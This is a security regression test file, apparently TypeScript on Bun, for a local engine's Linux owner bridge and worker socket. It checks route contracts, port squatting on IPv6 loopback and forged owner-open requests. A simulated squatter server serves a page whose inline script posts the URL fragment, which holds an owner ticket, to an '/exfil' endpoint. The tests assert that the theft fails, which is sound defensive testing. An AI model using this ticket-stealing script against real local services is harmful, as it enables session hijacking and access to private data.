// OLYMPUS_TEST_LANE: deploy
/** Regression cases adapted from the independent PR #400 security review. */
import { expect, test } from 'bun:test';
import { spawn, type ChildProcess } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { engineServicePaths, engineStatusPath } from '../src/core/engine-service.ts';
import { OWNER_BRIDGE_HOST_ENV } from '../src/core/linux-owner-bridge-host.ts';
import { manageLinuxOwnerBridge } from '../src/core/linux-owner-bridge.ts';
import { prepareWorkerSocket, bindWorkerSocket } from '../src/core/worker-transport.ts';

async function waitFor<T>(read: () => T | Promise<T>, ms = 30_000): Promise<NonNullable<T> | undefined> {
  const deadline = Date.now() + ms;
  do { try { const v = await read(); if (v) return v as NonNullable<T>; } catch {} await Bun.sleep(100); } while (Date.now() < deadline);
  return undefined;
}

// ---------------------------------------------------------------------------------------------------------------
// H1: real worker route table versus what the host asks.
test('H1a: real worker route contract: /v1/health is healthy and bare /health refuses', async () => {
  const root = mkdtempSync(join(tmpdir(), 'review400-h1a-'));
  const runtime = join(root, 'runtime'); mkdirSync(runtime, { mode: 0o700 });
  const reservation = Bun.serve({ hostname: '127.0.0.1', port: 0, fetch: () => new Response() });
  const port = reservation.port!; await reservation.stop(true);
  const token = 'review-400-fixture-token-aaaaaaaaaaaaaaaaaaaa';
  const env = { ...process.env, HOME: root, XDG_DATA_HOME: join(root, '.local', 'share'), XDG_STATE_HOME: join(root, '.local', 'state'), XDG_CONFIG_HOME: join(root, '.config'), XDG_RUNTIME_DIR: runtime, OLYMPUS_EMAIL_SOURCE_PORT: String(port), OLYMPUS_WORKER_AUTH_TOKEN: token };
  const child = spawn(process.execPath, [join(import.meta.dir, '../src/workers/email-source/server.ts')], { env, stdio: ['ignore', 'pipe', 'pipe'] });
  let output = ''; child.stdout!.on('data', d => { output += d; }); child.stderr!.on('data', d => { output += d; });
  const socket = join(runtime, 'olympus', 'worker.sock');
  try {
    const ask = async (path: string) => { const r = await fetch(`http://127.0.0.1:${port}${path}`, { unix: socket, headers: { Authorization: `Bearer ${token}` } } as RequestInit); return r.status; };
    if (!await waitFor(async () => (await ask('/v1/health')) === 200)) throw new Error('worker did not boot: ' + output.slice(-1500));
    const bare = await ask('/health');
    console.log('REVIEW400 real worker: /v1/health 200, /health ->', bare);
    expect(bare).toBe(404);
  } finally { await new Promise<void>(resolve => { child.once('exit', () => resolve()); child.kill('SIGKILL'); }); rmSync(root, { recursive: true, force: true }); }
}, 120_000);

test('H1b: real engine host + real worker: the desktop bridge reaches `listening`', async () => {
  const root = mkdtempSync(join(tmpdir(), 'review400-h1b-'));
  const runtime = join(root, 'runtime'); mkdirSync(runtime, { mode: 0o700 });
  const token = 'review-400-fixture-token-aaaaaaaaaaaaaaaaaaaa';
  const reservation = Bun.serve({ hostname: '127.0.0.1', port: 0, fetch: () => new Response() });
  const port = reservation.port!; await reservation.stop(true);
  const env = { ...process.env, HOME: root, XDG_DATA_HOME: join(root, '.local', 'share'), XDG_STATE_HOME: join(root, '.local', 'state'), XDG_CONFIG_HOME: join(root, '.config'), XDG_RUNTIME_DIR: runtime, OLYMPUS_WORKER_AUTH_TOKEN: token, OLYMPUS_SERVER_MODE: 'auto', OLYMPUS_EMAIL_SOURCE_PORT: String(port) };
  const paths = engineServicePaths({ homeDir: root, env, platform: 'linux' });
  mkdirSync(join(paths.configPath, '..'), { recursive: true, mode: 0o700 });
  const entry = `http://127.0.0.1:${port}`;
  writeFileSync(paths.configPath, JSON.stringify({ email: { baseUrl: entry + '/v1' }, remote: { enabled: false }, worker: { service: { enabled: true } } }));
  writeFileSync(join(root, 'desktop'), 'ready');
  const children: ChildProcess[] = [];
  const run = (args: string[], extra = {}) => { const c = spawn(process.execPath, args, { env: { ...env, ...extra }, stdio: ['ignore', 'pipe', 'pipe'] }); children.push(c); let out = ''; c.stdout!.on('data', d => { out += d; }); c.stderr!.on('data', d => { out += d; }); return { c, out: () => out }; };
  try {
    const host = run([join(import.meta.dir, 'helpers/linux-owner-bridge-process.ts'), 'host']);
    expect(await waitFor(() => host.out().includes('host-started'))).toBe(true);
    const control = join(runtime, 'olympus', readdirSync(join(runtime, 'olympus')).find(n => /^owner-host-.*\.sock$/.test(n))!);
    const worker = run([join(import.meta.dir, '../src/workers/email-source/server.ts')], { [OWNER_BRIDGE_HOST_ENV]: control });
    const socket = join(runtime, 'olympus', 'worker.sock');
    const up = await waitFor(async () => (await fetch(`${entry}/v1/health`, { unix: socket, headers: { Authorization: `Bearer ${token}` } } as RequestInit)).status === 200);
    if (!up) throw new Error('worker did not boot: ' + worker.out().slice(-1200));
    const status = async () => (await (await fetch('http://localhost/status', { unix: control } as RequestInit)).json() as { state: string });
    await waitFor(async () => (await status()).state === 'listening', 20_000);
    const final = await status();
    console.log('REVIEW400 bridge state with a healthy real worker:', final.state);
    expect(final.state).toBe('listening');
    await waitFor(() => existsSync(engineStatusPath(env)));
    // Several unchanged desktop/worker probes must not fsync the status again.
    await Bun.sleep(100);
    const before = statSync(engineStatusPath(env)).mtimeMs;
    await Bun.sleep(4_200);
    expect(statSync(engineStatusPath(env)).mtimeMs).toBe(before);
  } finally {
    await Promise.all(children.filter(c => c.exitCode === null && c.signalCode === null).map(c => new Promise<void>(res => { c.once('exit', () => res()); c.kill('SIGKILL'); })));
    rmSync(root, { recursive: true, force: true });
  }
}, 120_000);

// ---------------------------------------------------------------------------------------------------------------
// H2: the squatter that the held 127.0.0.1 listener does not stop.
function attackerServer(port: number, seen: string[], loot: { ticket: string }) {
  return Bun.serve({ hostname: '::1', port, async fetch(r) {
    const u = new URL(r.url);
    seen.push(`${r.method} ${r.headers.get('host')}${u.pathname}`);
    if (u.pathname === '/exfil') { loot.ticket = await r.text(); return new Response('ok'); }
    if (u.pathname === '/owner-proof') return new Response('<!doctype html><script>fetch("/exfil",{method:"POST",body:location.hash}).catch(()=>{})</script>hostile', { headers: { 'Content-Type': 'text/html', 'Access-Control-Allow-Origin': '*' } });
    return new Response('hostile');
  } });
}

test('H2a: while the bridge holds the port, a second account cannot bind the same port on [::1]', async () => {
  const root = mkdtempSync(join(tmpdir(), 'review400-h2a-'));
  const transport = { platform: 'linux', env: { HOME: root, XDG_RUNTIME_DIR: root } };
  const socketPath = prepareWorkerSocket(transport)!;
  const socket = bindWorkerSocket(socketPath, () => Bun.serve({ unix: socketPath, fetch: () => new Response('PRIVATE OWNER DATA') }));
  const reserve = Bun.serve({ hostname: '127.0.0.1', port: 0, fetch: () => new Response() }); const port = reserve.port!; await reserve.stop(true);
  const manager = manageLinuxOwnerBridge({ port, socketPath, transport, ready: () => true, platform: 'linux', fetchSocket: async () => new Response('x') });
  let v6: ReturnType<typeof Bun.serve> | undefined;
  try {
    expect(manager.status().state).toBe('listening');
    expect(() => Bun.serve({ hostname: '127.0.0.1', port, fetch: () => new Response() })).toThrow(); // the PR's EADDRINUSE check passes on IPv4
    try { v6 = Bun.serve({ hostname: '::1', port, fetch: () => new Response('squatter') }); } catch {}
    console.log('REVIEW400 [::1] squatter bound next to the held listener:', !!v6);
    expect(v6).toBeUndefined();
  } finally { v6?.stop(true); manager.close(); socket.stop(true); rmSync(root, { recursive: true, force: true }); }
});

const playwrightPath = process.env.OLYMPUS_TEST_PLAYWRIGHT;
test.skipIf(!playwrightPath)('H2b: chromium: the ticket page never reaches a [::1] squatter and no outsider can redeem the ticket', async () => {
  const playwright = await import(playwrightPath!);
  console.log('H2b: launching Chromium');
  const browser = await playwright.chromium.launch({ headless: true, args: ['--no-sandbox'], timeout: 15_000 });
  console.log('H2b: Chromium launched');
  const context = await browser.newContext();
  const root = mkdtempSync(join(tmpdir(), 'review400-h2b-'));
  const transport = { platform: 'linux', env: { HOME: root, XDG_RUNTIME_DIR: root } };
  const socketPath = prepareWorkerSocket(transport)!;
  const socket = bindWorkerSocket(socketPath, () => Bun.serve({ unix: socketPath, fetch: () => new Response('PRIVATE OWNER DATA') }));
  const reserve = Bun.serve({ hostname: '127.0.0.1', port: 0, fetch: () => new Response() }); const port = reserve.port!; await reserve.stop(true);
  let ticketPath = '';
  const manager = manageLinuxOwnerBridge({ port, socketPath, transport, ready: () => true, platform: 'linux',
    fetchSocket: async () => new Response('<!doctype html><html><head></head><body>PRIVATE OWNER DATA</body></html>', { headers: { 'Content-Type': 'text/html' } }), openFile: async p => { ticketPath = p; } });
  const seen: string[] = []; const loot = { ticket: '' };
  let attacker: ReturnType<typeof Bun.serve> | undefined;
  try {
    const entry = await fetch(`http://127.0.0.1:${port}/`, { redirect: 'manual' }); // any local client learns the origin from the 303
    const origin = new URL(entry.headers.get('location')!).origin;
    try { attacker = attackerServer(port, seen, loot); } catch { /* fixed: cannot bind */ }
    await manager.open('/dashboard');
    console.log('H2b: opening private file');
    const owner = await context.newPage();
    await owner.goto(pathToFileURL(ticketPath).href, { timeout: 10_000 });
    console.log('H2b: private file loaded');
    await owner.waitForURL(origin + '/dashboard', { timeout: 10_000 });
    expect(await owner.locator('body').textContent()).toContain('PRIVATE OWNER DATA');
    console.log('H2b: protected dashboard reached');
    let redeemed = 0;
    if (loot.ticket) {
      redeemed = (await fetch(`http://127.0.0.1:${port}/owner-proof`, { method: 'POST', headers: { Host: new URL(origin).host, Origin: origin, 'Content-Type': 'application/json' }, body: JSON.stringify({ ticket: loot.ticket.slice(1) }) })).status;
    }
    console.log('REVIEW400 squatter requests:', seen.length, 'ticket captured:', !!loot.ticket, 'raw redeem status:', redeemed);
    expect(!!loot.ticket).toBe(false);
  } finally {
    console.log('H2b: closing Chromium');
    await browser.close();
    console.log('H2b: Chromium closed');
    attacker?.stop(true); manager.close(); socket.stop(true); rmSync(root, { recursive: true, force: true });
  }
}, 60_000);

// ---------------------------------------------------------------------------------------------------------------
// M1: /owner-open is answered before any owner proof.
test('M1: browser confirmation cannot choose a path or starve the private CLI opener', async () => {
  const root = mkdtempSync(join(tmpdir(), 'review400-m1-'));
  const transport = { platform: 'linux', env: { HOME: root, XDG_RUNTIME_DIR: root } };
  const socketPath = prepareWorkerSocket(transport)!;
  const socket = bindWorkerSocket(socketPath, () => Bun.serve({ unix: socketPath, fetch: () => new Response('PRIVATE OWNER DATA') }));
  const reserve = Bun.serve({ hostname: '127.0.0.1', port: 0, fetch: () => new Response() }); const port = reserve.port!; await reserve.stop(true);
  let clock = 1_000_000; const opened: string[] = [];
  const manager = manageLinuxOwnerBridge({ port, socketPath, transport, ready: () => true, platform: 'linux', now: () => clock,
    fetchSocket: async () => new Response('x'), openFile: async p => { opened.push(p); } });
  try {
    const entry = await fetch(`http://127.0.0.1:${port}/`, { redirect: 'manual' });
    const origin = new URL(entry.headers.get('location')!).origin;
    const raw = (target: string) => fetch(`http://127.0.0.1:${port}/owner-open`, { method: 'POST', headers: { Host: new URL(origin).host, Origin: origin, 'Content-Type': 'application/json' }, body: JSON.stringify({ target }) });
    const first = await raw('/connect/authorize?client_id=attacker');
    console.log('REVIEW400 forged POST /owner-open:', first.status, 'owner windows opened:', opened.length);
    expect(first.status).toBe(204);
    expect(opened).toHaveLength(1);
    const { readFileSync } = await import('node:fs');
    const browserTicket = readFileSync(opened[0]!, 'utf8').match(/owner-proof#([A-Za-z0-9_-]{43})/)![1];
    const redeem = await fetch(`http://127.0.0.1:${port}/owner-proof`, { method: 'POST', headers: { Host: new URL(origin).host, Origin: origin, 'Content-Type': 'application/json' }, body: JSON.stringify({ ticket: browserTicket }) });
    expect((await redeem.json() as { target: string }).target).toBe('/dashboard');
    expect((await raw('/connect/authorize?client_id=attacker')).status).toBe(429);
    await expect(manager.open('/dashboard')).resolves.toBeDefined();
    const privatePath = opened[1]!;
    clock += 10_500;
    expect((await raw('/anything')).status).toBe(204);
    expect(existsSync(privatePath)).toBe(true); // the owner's own `olympus dashboard` is not starved
  } finally { manager.close(); socket.stop(true); rmSync(root, { recursive: true, force: true }); }
});
